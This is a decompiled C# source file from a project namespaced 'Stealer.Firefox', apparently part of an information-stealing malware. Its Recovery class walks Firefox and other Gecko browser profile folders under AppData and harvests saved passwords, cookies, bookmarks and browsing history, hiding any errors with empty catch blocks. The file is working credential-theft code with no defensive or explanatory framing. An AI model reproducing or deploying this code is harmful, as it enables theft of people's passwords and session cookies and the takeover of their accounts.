using System;
using System.IO;

namespace Stealer.Firefox
{
	// Token: 0x0200001D RID: 29
	internal sealed class Recovery : Browser
	{
		// Token: 0x06000090 RID: 144 RVA: 0x00006330 File Offset: 0x00004530
		public Recovery()
		{
			this.type = "FireFox";
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00006348 File Offset: 0x00004548
		protected override void Load()
		{
			base.Load();
			foreach (string text in Paths.sGeckoBrowserPaths)
			{
				try
				{
					bool flag = Directory.Exists(Paths.appdata + text + "\\Profiles");
					if (flag)
					{
						this.pBookmarks.AddRange(cBookmarks.Get(Paths.appdata + text));
						this.pCookies.AddRange(cCookies.Get(Paths.appdata + text));
						this.pHistory.AddRange(cHistory.Get(Paths.appdata + text));
						this.pPasswords.AddRange(cPasswords.Get(Paths.appdata + text));
					}
				}
				catch (Exception)
				{
				}
			}
		}
	}
}
